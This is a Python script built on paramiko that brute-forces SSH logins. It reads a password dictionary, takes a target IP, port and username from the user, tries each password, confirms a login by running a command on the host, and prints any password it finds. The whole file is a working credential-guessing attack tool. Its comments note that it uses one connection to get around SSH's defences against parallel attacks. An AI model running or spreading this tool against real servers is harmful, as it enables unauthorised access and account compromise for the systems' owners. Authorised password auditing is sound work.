#!/usr/bin/python3

from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
from time import sleep
from sys import exit
from os import system

# Due to the robust security protocols integrated within SSH, parallel attacks are considerably less effective. Consequently, I opted to employ a single attack connection

def get_encoder():
    print("\nINFO: Only valid for SSH services exposed on the Internet (Not Locally)")
    print("INFO: For compatibility with certain symbols, choose an encoding:")
    print("1) latin-1\n2) utf-8")
    encoder_text = input("option: ").strip()
    select_encoder = "latin-1" if encoder_text == "1" else "utf-8"
    return select_encoder

def ssh(client, passwords, hostname, username, port):
    backup_str = passwords if type(passwords) is str else ""
    if backup_str:
       passwords = "1"
    for pwd in passwords:
        if backup_str:
            pwd = backup_str
        try:
            client.connect(hostname, port=port, username=username, password=pwd, timeout=3)
            stdin, stdout, stderr = client.exec_command('echo "Ready"')
            output = stdout.read().decode().strip()
            if output == "Ready":
                print("\n{*********************** SUCCESS ***********************}")
                print(f"[✓] Password found:- {pwd}")
                client.close()
                exit(0)
            else:
                print(f"Unexpected output for password: {pwd}")
        except AuthenticationException:
            print(f"[*] Trying password:- {pwd}")
        except Exception as e:
            print(f"Error with password {pwd}: {e}")
        finally:
            client.close()
            sleep(0.01)

def read_dic(dic_path, port, hostname, username, encoder):
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())
    with open(dic_path, 'r', encoding=encoder) as file_read:
       chunk_size = 512 * 1024
       buffer = ""
       while True:
         chunk = file_read.read(chunk_size)
         if not chunk:
            break
         buffer += chunk
         lines = buffer.splitlines()
         buffer = lines.pop() if not chunk.endswith('\n') else ""
         ssh(client, lines, hostname, username, port)
       if buffer:
         ssh(client, buffer.strip(), hostname, username, port)
           

def main():
    try:
        encoder = get_encoder()
        sleep(1)
        system("clear")
        dic_path = input("Enter the dictionary path: ").strip()
        hostname = input("Enter SSH server IP: ").strip()
        port = input("Enter the port: ").strip()
        username = input("Enter SSH username: ").strip()
        read_dic(dic_path, port, hostname, username, encoder)
    except KeyboardInterrupt:
        print("\nExiting...")
        exit(0)
    except FileNotFoundError as f:
        print(f"File not found: {f}")
        exit(0)
    except IsADirectoryError as d:
        print(f"Error; it is a directory: {d}")
        exit(0)
        
if __name__ == '__main__':
     main()
 
__status__="Finish"
